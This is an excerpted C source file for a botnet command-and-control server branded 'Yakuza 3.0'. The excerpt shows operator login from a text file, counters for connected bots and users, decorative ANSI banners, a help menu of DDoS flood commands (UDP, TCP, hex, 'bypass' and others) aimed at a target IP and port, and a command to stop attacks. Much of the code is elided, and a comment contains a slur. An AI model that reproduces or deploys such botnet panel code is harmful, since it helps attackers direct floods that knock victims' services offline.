// Yakuza Private CNC version 3.0
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
...
int Find_Login(char *str) {
    ...
    if((fp = fopen("login.txt", "r")) == NULL){ // if for some reason you want to change the name of the login.txt file, ex: yourafuckingretard.txt, do it here but make sure you run nano "yourafuckingretard.txt" instead of login.txt
        return(-1);
    }
...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
		...
		sprintf(gang, "%c]0; Yakuza 3.0 %c", '\033', '\007');
        sprintf(user, "\e[38;5;93mUsername\e[97m: ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, gang, strlen(gang), MSG_NOSIGNAL) == -1) goto end;
...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0; Devices Connected [ %d ] | [ %s ] - Users Online [ %d ]%c", '\033', BotsConnected(), accounts[find_line].username, OperatorsConnected, '\007');
  ...
  sprintf(x5asciibannerline5,   "\e[97m                   ╦  \e[38;5;93m┌─┐┌─┐┌┬┐┬┌┐┌┌─┐                  \r\n");
  sprintf(x5asciibannerline6,   "\e[97m                   ║  \e[38;5;93m│ │├─┤ │││││││ ┬                  \r\n");
  sprintf(x5asciibannerline7,   "\e[97m                   ╩═╝\e[38;5;93m└─┘┴ ┴─┴┘┴┘└┘└─┘                  \r\n");
  ...
  sprintf(yeet2asciibannerline5,   "\e[97m                 ╔═╗\e[38;5;93m┬  ┌─┐┌─┐┌┐┌┬┌┐┌┌─┐                 \r\n");
  sprintf(yeet2asciibannerline6,   "\e[97m                 ║  \e[38;5;93m│  ├┤ ├─┤││││││││ ┬                 \r\n");
  sprintf(yeet2asciibannerline7,   "\e[97m                 ╚═╝\e[38;5;93m┴─┘└─┘┴ ┴┘└┘┴┘└┘└─┘                 \r\n");
  ...
  sprintf(lmao3asciibannerline5,   "\e[97m                  ╦  \e[38;5;93m┌─┐┌─┐┌─┐┬┌┐┌┌─┐                  \r\n");
  sprintf(lmao3asciibannerline6,   "\e[97m                  ║  \e[38;5;93m│ ││ ┬│ ┬│││││ ┬                  \r\n");
  sprintf(lmao3asciibannerline7,   "\e[97m                  ╩═╝\e[38;5;93m└─┘└─┘└─┘┴┘└┘└─┘                  \r\n");
  ...
  sprintf(lol4asciibannerline5,   "\e[97m                  ╔╗ \e[38;5;93m┌─┐┌─┐┬┌─┌┬┐┬─┐┌─┐┌─┐┬┌┐┌┌─┐                  \r\n");
  sprintf(lol4asciibannerline6,   "\e[97m                  ╠╩╗\e[38;5;93m├─┤│  ├┴┐ │ ├┬┘├─┤│  │││││ ┬                  \r\n");
  sprintf(lol4asciibannerline7,   "\e[97m                  ╚═╝\e[38;5;93m┴ ┴└─┘┴ ┴ ┴ ┴└─┴ ┴└─┘┴┘└┘└─┘                  \r\n");
  ...
  sprintf(xd5asciibannerline4,   "\e[96m                                                                     \r\n");
  sprintf(xd5asciibannerline5,   "\e[97m                  ╔═╗\e[38;5;93m┬  ┌┬┐┌─┐┌─┐┌┬┐  ╔╦╗┌─┐┌┐┌┌─┐ ┬                 \r\n");
  sprintf(xd5asciibannerline6,   "\e[97m                  ╠═╣\e[38;5;93m│  ││││ │└─┐ │    ║║│ ││││├┤  │                 \r\n");
  sprintf(xd5asciibannerline7,   "\e[97m                  ╩ ╩\e[38;5;93m┴─┘┴ ┴└─┘└─┘ ┴   ═╩╝└─┘┘└┘└─┘ o                 \r\n");
  ...
  sprintf(haha8asciibannerline3,   "\e[96m                                                           \r\n");
  sprintf(haha8asciibannerline4,   "\e[96m                                                           \r\n");
  sprintf(haha8asciibannerline5,   "\e[97m                  ╔═╗\e[38;5;93m┬┌┐┌┬┌─┐┬ ┬┌─┐┌┬┐  ┬                  \r\n");
  sprintf(haha8asciibannerline6,   "\e[97m                  ╠╣ \e[38;5;93m│││││└─┐├─┤├┤  ││  │                  \r\n");
  sprintf(haha8asciibannerline7,   "\e[97m                  ╚  \e[38;5;93m┴┘└┘┴└─┘┴ ┴└─┘─┴┘  o                  \r\n");
  ...
  sprintf(lmfao9asciibannerline8,   "\e[90m																						\r\n");
		...
		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "BOTS")) {
				...
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    "\e[38;5;93mBots: \e[97m%d\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(statuscount, "\e[38;5;93mDups: \e[97m%d\r\n", TELFound, scannerreport);
				sprintf(ops,         "\e[38;5;93mUsers: \e[97m%d\r\n", OperatorsConnected, scannerreport);
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "?")) {
				...
				sprintf(hp1,  "\e[97m!*\e[38;5;93m XSE [\e[1;37mIP\e[38;5;93m] [\e[1;37mPORT\e[38;5;93m] TIME 32 1024 10\e[38;5;93m\e[01;37m ~ valve flood              \r\n");
				sprintf(hp2,  "\e[97m!*\e[38;5;93m HEX [\e[1;37mIP\e[38;5;93m] [\e[1;37mPORT\e[38;5;93m] TIME\e[38;5;93m]\e[01;37m ~ hex flood                          \r\n");
				sprintf(hp3,  "\e[97m!*\e[38;5;93m STD [\e[1;37mIP\e[38;5;93m] [\e[1;37mPORT\e[38;5;93m] TIME\e[38;5;93m]\e[01;37m ~ std flood                          \r\n");
				sprintf(hp4,  "\e[97m!*\e[38;5;93m UDP [\e[1;37mIP\e[38;5;93m] [\e[1;37mPORT\e[38;5;93m] TIME SIZE 0 32\e[38;5;93m\e[01;37m ~ udp flood                 \r\n");
				sprintf(hp5,  "\e[97m!*\e[38;5;93m TCP [\e[1;37mIP\e[38;5;93m] [\e[1;37mPORT\e[38;5;93m] TIME FLAGS SIZE 0 32\e[38;5;93m\e[01;37m ~ tcp flood           \r\n");
				sprintf(hp6,  "\e[97m!*\e[38;5;93m VOX [\e[1;37mIP\e[38;5;93m] [\e[1;37mPORT\e[38;5;93m] TIME SIZE 0 32\e[38;5;93m\e[01;37m ~ Custom voxility flood     \r\n");
				sprintf(hp7,  "\e[97m!*\e[38;5;93m PLAIN [\e[1;37mIP\e[38;5;93m] [\e[1;37mPORT\e[38;5;93m] TIME 1024 10 32\e[38;5;93m\e[01;37m ~ Udpplain flood         \r\n");
				sprintf(hp8,  "\e[97m!*\e[38;5;93m UDPBYPASS [\e[1;37mIP\e[38;5;93m] [\e[1;37mPORT\e[38;5;93m] TIME 1024\e[38;5;93m\e[01;37m ~ Udp Bypass flood         \r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "STOP"))
			{
				...
				sprintf(killattack, "\e[97m[\e[38;5;93mYAKUZA\e[97m] \e[31mATTACKS SEIZED\r\n");
